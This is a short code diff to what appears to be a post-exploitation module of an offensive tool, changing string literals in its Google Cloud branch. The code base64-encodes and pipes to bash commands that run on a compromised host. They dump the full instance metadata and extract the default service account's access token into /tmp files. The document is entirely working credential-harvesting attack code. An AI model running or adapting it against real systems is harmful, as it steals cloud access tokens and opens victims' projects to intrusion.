@@ -96,7 +96,7 @@ class Module(BaseModule):
                 elif csp == "gcp":
                     # get instance metadata
                     payload = base64.b64encode(
-                        b'''curl "http://metadata.google.internal/computeMetadata/v1/?recursive=true&alt=text" -H "Metadata-Flavor: Google" > /tmp/instance_metadata.json''')
+                        b"curl \"http://metadata.google.internal/computeMetadata/v1/?recursive=true&alt=text\" -H \"Metadata-Flavor: Google\" > /tmp/instance_metadata.json")
                     result = session.platform.run(
                         f"/bin/bash -c 'echo {payload.decode()} | tee /tmp/payload_instancemetadata | base64 -d | /bin/bash'",
                         cwd="/tmp", timeout=900)
@@ -104,7 +104,7 @@ class Module(BaseModule):
                     # get instance token
                     # example usage: curl https://compute.googleapis.com/compute/v1/projects/PROJECT_ID/zones/ZONE/instances -H "Authorization":"Bearer ACCESS_TOKEN"
                     payload = base64.b64encode(
-                        '''ACCESS_TOKEN=$(curl "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" -H "Metadata-Flavor: Google" | jq -r '.access_token')
+                        b'''ACCESS_TOKEN=$(curl "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" -H "Metadata-Flavor: Google" | jq -r '.access_token')
                         echo $ACCESS_TOKEN > /tmp/instance_access_token.json
                         ''')
                     result = session.platform.run(
